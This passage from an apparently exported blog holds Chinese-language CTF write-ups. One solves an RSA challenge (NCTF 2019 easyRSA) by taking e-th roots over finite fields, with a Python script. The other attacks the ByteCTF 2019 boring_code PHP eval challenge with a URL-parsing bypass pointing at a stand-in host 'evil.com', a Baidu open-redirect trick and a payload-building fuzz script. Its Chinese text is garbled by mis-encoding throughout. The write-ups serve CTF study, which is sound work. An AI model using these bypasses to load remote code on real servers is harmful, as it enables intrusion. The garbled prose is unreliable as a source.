id="RSA-e-mid-p-1-e-mid-q-1"><a href="#RSA-e-mid-p-1-e-mid-q-1" class="headerlink" title="RSA - $e\mid (p-1),e\mid (q-1)$"></a>RSA - $e\mid (p-1),e\mid (q-1)$</h3><h4 id="Theorem-16"><a href="#Theorem-16" class="headerlink" title="Theorem"></a>Theorem</h4><p>å‰é¢æåˆ°è¿‡$gcd(e,\varphi(n))\neq 1$çš„æƒ…å†µï¼Œä½†ä¸é’ˆå¯¹$gcd(e,\varphi(n))=e$ï¼Œäºæ˜¯è¿™é‡Œå°±å¯¹$e\mid (p-1),e\mid (q-1)$çš„ç‰¹æ®Šæƒ…å†µè¿›è¡Œè®¨è®º.</p><p>è§£é¢˜æ€è·¯å³æ±‚è§£m mod på’Œm mod qï¼Œå†é€šè¿‡CRTè¿˜åŸm mod n. ä¸»è¦éš¾ç‚¹åˆ™æ˜¯åœ¨$GF(p)$ä¸Šæ±‚eæ¬¡æ ¹.</p><p>åœ¨æœ‰é™åŸŸä¸Šæ±‚r-th rootæœ‰ä¸¤ä¸ªå¸¸è§ç®—æ³•ï¼ˆAdleman-Manders-Miller algorithmå’ŒCipolla-Lehmer algorithmï¼‰ï¼Œä½†è¿™é‡Œä»‹ç»çš„æ˜¯Namhun Kooæå‡ºçš„ä¸€ç§æ›´å…·ä¸€èˆ¬æ€§çš„å¼€æ ¹ç®—æ³•ï¼Œä¸”åœ¨sè¶³å¤Ÿå°çš„æ—¶å€™æ›´é«˜æ•ˆï¼ˆ$r^{s}\mid (p-1),r^{s}\nmid (p-1)$ï¼‰.</p><ul><li><strong>New r-th root extraction formula over $F_{q}$ for $q\equiv lr^{s}+1(mod\ r^{s+1})$ and r is a prime</strong></li></ul><p><strong>[Theorem 1]</strong></p><p>è®¾cæ˜¯åœ¨$F_q$ä¸Šçš„ä¸€ä¸ªræ¬¡å‰©ä½™ï¼Œåˆ™$\exists b\in F_{q},s.t.\ ord_{q}(c^{r-1}b^{r})=r^{t}.(0\leq t&lt;s)$</p><p>Proofï¼š</p><p>$\because gcd(r,l)=1\quad \therefore\exists(\alpha,\beta),s.t.\ r\beta +r-1=l\alpha$.</p><p>$\alpha =\frac{r\beta +r-1}{l}$ï¼Œä»¤$\zeta=(c^{\alpha})^{\frac{q-1}{r^{s}}}=(c^{\alpha})^{\frac{q-1}{r^{s}}}c^{r\beta +r-1-l\alpha}=c^{r-1}(c^{\beta+\alpha\frac{q-1-lr^{s}}{r^{s+1}}})^{r}=c^{r-1}b^{r}$.</p><p>$\because c$æ˜¯$F_{q}$ä¸Šçš„ræ¬¡å‰©ä½™ï¼Œä¸”æŒ‡æ•°å«$\frac{q-1}{r^{s}}$ï¼Œåˆ™$ord_{q}(\zeta)=r^{t}.(t&lt;s)$</p><p>åˆ™ç”±Theorem 1ï¼Œæˆ‘ä»¬ä»¤$\xi$ä¸º$F_{q}$ä¸Šçš„ä¸€$r^{s}$é˜¶å•ä½æ ¹ï¼Œè¦å–ç¬¦åˆè¦æ±‚çš„$\xi$ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾—$\xi=d^{\frac{q-1}{r^{s}}}$ï¼Œå…¶ä¸­dä¸ºæ¨¡qçš„ræ¬¡éå‰©ä½™ï¼ˆæ¦‚ç‡çº¦ä¸º$\frac{r-1}{r}$ï¼‰.</p><p>åˆ™å­˜åœ¨å”¯ä¸€çš„$(i,j)$ï¼Œä½¿å¾—$\xi^{r^{s-t}}=\zeta^{i},\zeta=(\xi^{r^{s-t}})^j$ï¼Œå³$ij\equiv 1(mod\ r^{t})$.</p><p><strong>[Theorem 2]</strong></p><p>ä»¤$u\equiv j(r^{t}-1)r^{s-t-1}\equiv -jr^{s-t-1}(mod\ r^{s-1})$ï¼Œåˆ™$F_{q}$ä¸‹cçš„ä¸€ä¸ªræ¬¡æ ¹å³ä¸º$cb\xi^{u}$ï¼Œbåœ¨Theorem 1ä¸­å·²ç»™å‡ºå®šä¹‰.</p><p>Proofï¼š</p><p>$(cb\xi^{u})^{r}=cc^{r-1}b^{r}\xi^{ur}=c\zeta\xi^{ur}$.</p><p>$\because u=j(r^{t}-1)r^{s-t-1}+kr^{s-1},\xi^{r^{s}}=1.$</p><p>$\therefore \zeta\xi^{ur}=(\xi^{r^{s-t}})^{j}\xi^{ur}=\xi^{jr^{s-t}+ur}=\xi^{jr^{s-t}+kr^{s}+j(r^{t}-1)r^{s-t}}=\xi^{jr^{s}}=1.$</p><p>$\therefore (cb\xi^{u})^{r}=c.$</p><p><strong>[Remark 1]</strong></p><p>Theoremé‡Œçš„$r\beta +r-1=l\alpha$ç¡®å®šçš„$\alpha$ mod rå’Œ$\beta$ mod læ˜¯å”¯ä¸€çš„. ä¸”ä¸Šå¼å¯ä»¥æ‰©å±•åˆ°$\frac{q-1}{r}$çš„æ¨¡åŸŸä¸Šï¼ˆ$r\beta + r-1\equiv l\alpha(mod\ \frac{q-1}{r})$ï¼‰ï¼Œå› ä¸ºcæ˜¯$F_{q}$ä¸Šçš„ræ¬¡å‰©ä½™ï¼Œå³$c^{\frac{q-1}{r}}=1$.</p><p><strong>[Remark 2]</strong></p><p>$cb=c^{\beta+1+\alpha\frac{q-1-lr^{s}}{r^{s+1}}}=c^{\frac{(\beta+1)r^{s+1}+\alpha(q-1)-\alpha lr^{s}}{r^{s+1}}}=c^{\frac{r^{s}((\beta+1)r-\alpha l)+\alpha(q-1)}{r^{s+1}}}=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}.$</p><p><strong>[Remark 3]</strong></p><p>Theorem 1ç»“å°¾æåˆ°çš„$(i,j)$åœ¨$r^{t}$è¾ƒå¤§æ—¶æ±‚è§£å›°éš¾ï¼Œå› æ­¤æœ¬æ–¹æ³•åœ¨rå’Œtè¿‡å¤§æ—¶å¹¶ä¸é«˜æ•ˆ.</p><p><strong>[åˆ©ç”¨]</strong></p><ul><li><p>s = 1æ—¶ï¼ˆå³$q\equiv lr+1(mod\ r^{2})$æ—¶ï¼‰</p><p>$\because t&lt;s\quad\therefore t=0,u=0.$</p><p>$cb\xi^{u}=cb$å³ä¸ºä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ræ¬¡æ ¹.</p><p>ç”±Remark 3çŸ¥ï¼Œ$cb=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}=c^{\frac{1+\frac{\alpha(q-1)}{r}}{r}}$ï¼Œè‡³äº$\alpha$å¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¾ˆè½»æ˜“å¾—åˆ°.</p></li><li><p>s &gt; 1æ—¶ï¼Œtå¯èƒ½è½åœ¨{0, â€¦, s - 1}ä¸Šï¼Œå› æ­¤åˆ†ææ—¶è¦åˆ†çš„æƒ…å†µä¼šå¤šä¸å°‘ï¼ˆåœ¨è¿™é‡Œå°±ä¸å ç¯‡å¹…å»å†™äº†ï¼Œpaperé“¾æ¥ä¼šåœ¨Linkä¸­ç»™å‡ºï¼‰</p></li><li><p>ä¸Šè¿°ç®—æ³•ç»™å‡ºçš„åªæ˜¯$G_{q}$ä¸Šcçš„å…¶ä¸­ä¸€ä¸ªræ¬¡æ ¹ï¼Œä½†è¦æ‰¾å‡ºæ‰€æœ‰çš„ræ¬¡æ ¹ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦å€ŸåŠ©ræ¬¡å•ä½æ ¹å³å¯</p><p>$G_{q}$ä¸Šçš„ræ¬¡å•ä½æ ¹($r\mid (q-1)$)ä¸º{$x^{i(\frac{q-1}{r})}$}($i\in[0,q)$), æˆ‘ä»¬å–ä¸€ä¸ªä¸ä¸º1çš„ræ¬¡å•ä½æ ¹ä¸æˆ‘ä»¬å…ˆå‰æ‰¾åˆ°çš„ç‰¹è§£ç”Ÿæˆä¸€ä¸ªré˜¶å¾ªç¯ç¾¤å³æ‰¾åˆ°é€šè§£.</p></li></ul><h4 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rthroot</span><span class="params">(c, r, q)</span>:</span></span><br><span class="line">    c %= q</span><br><span class="line">    <span class="keyword">assert</span>(isPrime(r) <span class="keyword">and</span> (q - <span class="number">1</span>) % r == <span class="number">0</span> <span class="keyword">and</span> (q - <span class="number">1</span>) % (r**<span class="number">2</span>) != <span class="number">0</span>)</span><br><span class="line">    l = ((q - <span class="number">1</span>) % (r**<span class="number">2</span>)) // r</span><br><span class="line">    alpha = (-inverse(l, r)) % r</span><br><span class="line">    root = pow(c, ((<span class="number">1</span> + alpha * (q - <span class="number">1</span>) // r) // r), q)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(r, q, root)</span>:</span></span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, q), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % q</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def crt(ai, mi):</span></span><br><span class="line"><span class="string">    a1, m1 = ai[0], mi[0]</span></span><br><span class="line"><span class="string">    a2, m2 = ai[1], mi[1]</span></span><br><span class="line"><span class="string">    return (a1 * inverse(m2, m1) * m2 + a2 * inverse(m1, m2) * m1) % (m1 * m2)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(proot, qroot, p, q)</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = len(proot) * len(qroot)</span><br><span class="line">    step = total // <span class="number">100</span></span><br><span class="line">    t1 = inverse(q, p)</span><br><span class="line">    t2 = inverse(p, q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> proot:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> qroot:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % step == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">'\r&#123;&#125;%'</span>.format(count // step), end=<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#root = (i, j)</span></span><br><span class="line">            <span class="comment">#m = crt(root, (p, q))</span></span><br><span class="line">            m = (i * t1 * q + j * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> unhexlify(hex(m)[<span class="number">2</span>:<span class="number">10</span>]) == <span class="string">b'NCTF'</span>:</span><br><span class="line">                print(<span class="string">'\n'</span>, long_to_bytes(m))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">    q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">    e = <span class="number">0x1337</span></span><br><span class="line">    c = <span class="number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line">    print(<span class="string">'[+] Calculating e-th root...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    proot = rthroot(c, e, p)</span><br><span class="line">    qroot = rthroot(c, e, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] Calculating all e-th roots...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    all_proot = allroot(e, p, proot)</span><br><span class="line">    all_qroot = allroot(e, q, qroot)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] CRT cracking...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    decrypt(all_proot, all_qroot, p, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-3"><a href="#More-3" class="headerlink" title="More"></a>More</h4><p>expå¯¹åº”2019-NCTF-easyRSA.</p><p>åšå®Œä»¥åå»æ‰¾äº†å®˜æ–¹wpï¼Œå‘ç°é¢„æœŸè§£æ˜¯Adleman-Manders-Miller algorithmï¼Œè¿™é‡Œç»™å‡ºé“¾æ¥</p><p><a href="http://www.soreatu.com/ctf/writeups/Writeup for Crypto problems in NCTF 2019.html#easyrsa" target="_blank" rel="noopener">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a></p><p>[æ³¨]</p><p>expç¬¬ä¸€æ¬¡è°ƒè¯•çš„æ—¶å€™å‘ç°é€Ÿåº¦å¾ˆæ…¢-.-åæ¥å‘ç°æ˜¯å¤§é‡crtçš„è°ƒç”¨ä½¿å¾—è®¡ç®—äº†æ¥è¿‘$e^{2}$æ¬¡çš„inverse(p, q)å’Œinverse(q,p)ï¼Œå› æ­¤å°†è¿™ä¸¤ä¸ªcrtä¸­ç”¨åˆ°çš„å˜é‡é”å®šå³å¯.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-25_09-54-37.png" alt></p><h4 id="Link-1"><a href="#Link-1" class="headerlink" title="Link"></a>Link</h4><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2013/117.pdf</a></p><p><a href="https://arxiv.org/pdf/1111.4877.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1111.4877.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ByteCTF2019] - boring_code</title>
      <link href="/2019/10/22/ByteCTF2019-boring-code/"/>
      <url>/2019/10/22/ByteCTF2019-boring-code/</url>
      
        <content type="html"><![CDATA[<h2 id="ç™½ç›’å®¡è®¡"><a href="#ç™½ç›’å®¡è®¡" class="headerlink" title="ç™½ç›’å®¡è®¡"></a>ç™½ç›’å®¡è®¡</h2><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'$url: '</span>.$url.<span class="string">"\n"</span>);</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'$code: '</span>.$code.<span class="string">"\n"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸»è¦ä¸¤ä¸ªbypassç‚¹"><a href="#ä¸»è¦ä¸¤ä¸ªbypassç‚¹" class="headerlink" title="ä¸»è¦ä¸¤ä¸ªbypassç‚¹"></a><strong>ä¸»è¦ä¸¤ä¸ªbypassç‚¹</strong></h3><h4 id="1-ç»•è¿‡filter-varå’Œparse-url"><a href="#1-ç»•è¿‡filter-varå’Œparse-url" class="headerlink" title="1. ç»•è¿‡filter_varå’Œparse_url"></a>1. ç»•è¿‡filter_varå’Œparse_url</h4><h4 id="2-ä»¤codeåœ¨preg-matchä¸‹è¿›è¡Œæ–‡ä»¶è¯»å–"><a href="#2-ä»¤codeåœ¨preg-matchä¸‹è¿›è¡Œæ–‡ä»¶è¯»å–" class="headerlink" title="2. ä»¤codeåœ¨preg_matchä¸‹è¿›è¡Œæ–‡ä»¶è¯»å–"></a>2. ä»¤codeåœ¨preg_matchä¸‹è¿›è¡Œæ–‡ä»¶è¯»å–</h4><hr><h2 id="Bypass-0x01"><a href="#Bypass-0x01" class="headerlink" title="Bypass 0x01"></a>Bypass 0x01</h2><hr><p>å¯¹äºå¦‚ä½•ç»•è¿‡filter_var(), preg_match() å’Œ parse_url()ï¼Œæˆ‘æ‰¾åˆ°å¸ˆå‚…çš„ä¸€ç¯‡<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">åšå®¢</a>ï¼Œä½†è¿™ç¯‡åšå®¢æ˜¯é’ˆå¯¹curlçš„ï¼Œåœ¨è¿™é¢˜è²Œä¼¼å¹¶ä¸é€‚ç”¨<br>è€Œä¸”å¯¹è¿™ç¯‡çš„ä¸€ä¸ªbypassæ‰‹æ³•æˆ‘æœ‰äº›æ‡µ<br>åˆ©ç”¨<code>0://evil.com:port;baidu.com:80</code>è¿™æ ·çš„urlï¼ˆ0ä¸ºä¼ è¾“åè®®ï¼Œéhttpï¼Œä¸ºäº†ç»•è¿‡filter_var())<br>curlè§£æåˆ°;åœæ­¢ï¼Œè¿™æ ·å°±è®¿é—®äº†<code>0://evil.com:port</code>ï¼Œä½†æ˜¯éhttpåè®®çš„è¯ï¼Œæ¯”å¦‚ftpï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®<code>ftp://evil.com:port</code>ï¼Œè²Œä¼¼å–ä¸åˆ°æ–‡ä»¶é‡Œçš„å†…å®¹ï¼ˆå…ˆç•™ä¸ªå‘ï¼‰</p><p>ä½†è¿˜æœ‰å¸ˆå‚…çš„wpé‡Œè¯´å¯ä»¥ftpåè®®ç»•è¿‡-.-</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-35.png" alt></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-09.png" alt></p><p>é‚£ä¹ˆä¸é€‰æ‹©æ°ªé‡‘çš„è¯ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨ç™¾åº¦çš„è·³è½¬æ¼æ´å­â€¦</p><h3 id="è´´å§ğŸ„â€"><a href="#è´´å§ğŸ„â€" class="headerlink" title="è´´å§ğŸ„â€"></a>è´´å§ğŸ„â€</h3><ol><li><p>å»è´´å§éšä¾¿æ‰¾ä¸ªå°è´´å­ï¼Œå‘è¡¨è¯„è®ºï¼ˆè¯„è®ºå†…å®¹æ˜¯ä½ è¦è·³è½¬çš„é“¾æ¥ï¼‰<br>å‘å¸ƒåå®¡æŸ¥å…ƒç´ çœ‹åˆ°ä½ å‘è¡¨çš„é“¾æ¥å¯¹åº”çš„href<br><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-06-19.png" alt></p></li><li><p>å°†jump.bdimg.comæ”¹ä¸ºpost.baidu.comåå¾—åˆ°çš„æ–°é“¾æ¥å³å¯ç›´æ¥è·³è½¬è‡³ä½ æƒ³è¦çš„ç«™ç‚¹</p></li></ol><p>okç¬¬ä¸€æ­¥bypassæˆåŠŸ</p><hr><h2 id="Bypass-0x02"><a href="#Bypass-0x02" class="headerlink" title="Bypass 0x02"></a>Bypass 0x02</h2><hr><p>preg_matché™åˆ¶æˆ‘ä»¬file_get_contentså¾—åˆ°çš„å†…å®¹åªèƒ½æ˜¯a(b(c(d())))è¿™æ ·çš„æ ¼å¼<br><strong>(?R)æŒ‡è¿­ä»£è‹¥å¹²æ¬¡æ­£åˆ™è¡¨è¾¾å¼æ•´ä½“</strong></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-12-16.png" alt></p><p>è€Œä¸”åˆæœ‰ä¸€ä¸²çš„é»‘åå•è¿‡æ»¤ï¼Œæ‰€ä»¥åŸºæœ¬æ”¾å¼ƒgetshellï¼Œå°è¯•æ–‡ä»¶è¯»å–<br>ä½†ç”±äºåˆšåˆšè¯´çš„æ­£åˆ™åŒ¹é…ç™½åå•ï¼Œæˆ‘ä»¬ä¸èƒ½ä¼ å…¥scandir(â€˜.â€™)è¿™æ ·çš„å¼å­ï¼Œä½†è¿™ä¸ªå¼å­ç­‰ä»·scandir(chr(46))ï¼Œä¸”phpversion()æ˜¯ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸²æ•°å­¦å‡½æ•°æŠŠphpversion()è½¬åŒ–æˆæˆ‘ä»¬è¦çš„46</p><p>é¦–å…ˆæ¢æµ‹phpversionä¿¡æ¯ï¼š</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-42-09.png" alt></p><p>å‘ç°æ˜¯5.&#42;ç‰ˆæœ¬çš„phpï¼Œé‚£å°±ä»5/6å‡ºå‘å»è·å¾—46</p><p>ç»™å‡ºæ•°å­¦å‡½æ•°çš„fuzzè„šæœ¬ï¼ˆè¿™é‡Œåˆ©ç”¨è¿­ä»£åŠ æ·±æœç´¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_fuzz</span><span class="params">($tmp, $goal, $depth = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$math_func = [<span class="string">'sin'</span>, <span class="string">'cos'</span>, <span class="string">'tan'</span>,  <span class="string">'asin'</span>, <span class="string">'acos'</span>, <span class="string">'atan'</span>, <span class="string">'sqrt'</span>, <span class="string">'ceil'</span>, <span class="string">'floor'</span>,<span class="string">'sinh'</span>,<span class="string">'cosh'</span>,<span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">if</span>($depth &gt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($math_func <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">if</span>(ceil($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'ceil'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">elseif</span>( floor($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'floor'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$res = [];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($res = math_fuzz($func($tmp), $goal, $depth + <span class="number">1</span>))) &#123;</span><br><span class="line">array_push($res, $func);</span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$orig = <span 